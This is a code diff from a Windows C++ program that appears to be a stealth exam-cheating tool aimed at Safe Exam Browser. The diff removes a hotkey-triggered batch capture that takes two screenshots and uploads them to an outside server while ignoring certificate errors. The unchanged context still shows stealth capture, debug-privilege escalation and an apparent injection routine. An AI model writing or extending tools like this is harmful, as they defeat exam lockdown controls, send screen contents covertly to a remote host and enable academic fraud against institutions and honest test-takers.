@@ -242,89 +242,6 @@ void CaptureThreadFunc(int user_id) {
 
 void DoStealthCapture(int user_id) { std::thread t(CaptureThreadFunc, user_id); t.detach(); }
 
-// --- BATCH CAPTURE (Ctrl+Shift+Z) ---
-// Captures 2 screenshots 1.5s apart and uploads via /upload_batch for D&D tasks.
-void UploadBatchToCloud(const std::vector<uint8_t>& jpg1, const std::vector<uint8_t>& jpg2, int user_id) {
-    HINTERNET hSession = InternetOpenA("SEB-Stealth-Batch", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hSession) return;
-    HINTERNET hConnect = InternetConnectA(hSession, "exam-system-v1.onrender.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConnect) { InternetCloseHandle(hSession); return; }
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload_batch", NULL, NULL, NULL,
-        INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
-    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return; }
-
-    std::string boundary = "----BatchBoundaryGhost";
-    std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
-    headers += "X-Secret: " + std::string(SECRET_KEY) + "\r\n";
-    headers += "X-User-Id: " + std::to_string(user_id) + "\r\n";
-
-    auto makePart = [&](const std::string& fname, const std::vector<uint8_t>& data) {
-        std::string part = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"" + fname + "\"; filename=\"" + fname + ".jpg\"\r\nContent-Type: image/jpeg\r\n\r\n";
-        return part;
-    };
-
-    std::vector<uint8_t> body;
-    // file_1
-    std::string p1 = makePart("file_1", jpg1);
-    body.insert(body.end(), p1.begin(), p1.end());
-    body.insert(body.end(), jpg1.begin(), jpg1.end());
-    std::string crlf = "\r\n";
-    body.insert(body.end(), crlf.begin(), crlf.end());
-    // file_2
-    std::string p2 = makePart("file_2", jpg2);
-    body.insert(body.end(), p2.begin(), p2.end());
-    body.insert(body.end(), jpg2.begin(), jpg2.end());
-    body.insert(body.end(), crlf.begin(), crlf.end());
-    // close
-    std::string closing = "--" + boundary + "--\r\n";
-    body.insert(body.end(), closing.begin(), closing.end());
-
-    if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), body.data(), (DWORD)body.size())) {
-        Beep(1200, 80); Beep(1500, 80); // Batch upload success beeps
-    } else {
-        Beep(200, 500); // Fail beep
-    }
-    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
-}
-
-std::vector<uint8_t> CaptureScreenToJpeg() {
-    int x = GetSystemMetrics(SM_XVIRTUALSCREEN), y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN), h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-    HDC hdc = GetDC(NULL);
-    std::vector<uint8_t> jpg;
-    if (!hdc) return jpg;
-    HDC memdc = CreateCompatibleDC(hdc); HBITMAP hbmp = CreateCompatibleBitmap(hdc, w, h);
-    HBITMAP oldbmp = (HBITMAP)SelectObject(memdc, hbmp);
-    if (BitBlt(memdc, 0, 0, w, h, hdc, x, y, SRCCOPY | CAPTUREBLT)) {
-        BITMAPINFOHEADER bi = { sizeof(bi), w, -h, 1, 32, BI_RGB };
-        std::vector<uint8_t> px(w * h * 4);
-        GetDIBits(hdc, hbmp, 0, h, px.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
-        auto wf = [](void* ctx, void* data, int size) { auto v = (std::vector<uint8_t>*)ctx; v->insert(v->end(), (uint8_t*)data, (uint8_t*)data + size); };
-        stbi_write_jpg_to_func(wf, &jpg, w, h, 4, px.data(), 80);
-    }
-    SelectObject(memdc, oldbmp); DeleteObject(hbmp); DeleteDC(memdc); ReleaseDC(NULL, hdc);
-    return jpg;
-}
-
-void BatchCaptureThreadFunc(int user_id) {
-    Beep(1500, 50); Beep(1500, 50); // Double beep: batch mode
-    HDESK hInput = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
-    HDESK hOriginal = GetThreadDesktop(GetCurrentThreadId());
-    if (hInput) SetThreadDesktop(hInput);
-    
-    auto jpg1 = CaptureScreenToJpeg();
-    Sleep(1500); // Wait 1.5s for user to scroll / see second part
-    auto jpg2 = CaptureScreenToJpeg();
-    
-    if (!jpg1.empty() && !jpg2.empty()) {
-        Beep(1800, 50);
-        UploadBatchToCloud(jpg1, jpg2, user_id);
-    }
-    if (hInput) { SetThreadDesktop(hOriginal); CloseDesktop(hInput); }
-}
-
-void DoBatchCapture(int user_id) { std::thread t(BatchCaptureThreadFunc, user_id); t.detach(); }
-
 int main() {
     SetProcessDPIAware(); EnableDebugPrivilege();
     SECURITY_DESCRIPTOR sd; InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
@@ -341,11 +258,6 @@ int main() {
         CheckAndInject();
         
         if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
-            // Ctrl+Shift+Z = batch capture (2 screenshots) for D&D tasks
-            if (GetAsyncKeyState('Z') & 0x8000) {
-                DoBatchCapture(1);
-                while (GetAsyncKeyState('Z') & 0x8000) Sleep(100);
-            }
             // Ctrl+Shift+X = quick capture for User 1 (backward compat)
             if (GetAsyncKeyState('X') & 0x8000) {
                 DoStealthCapture(1);
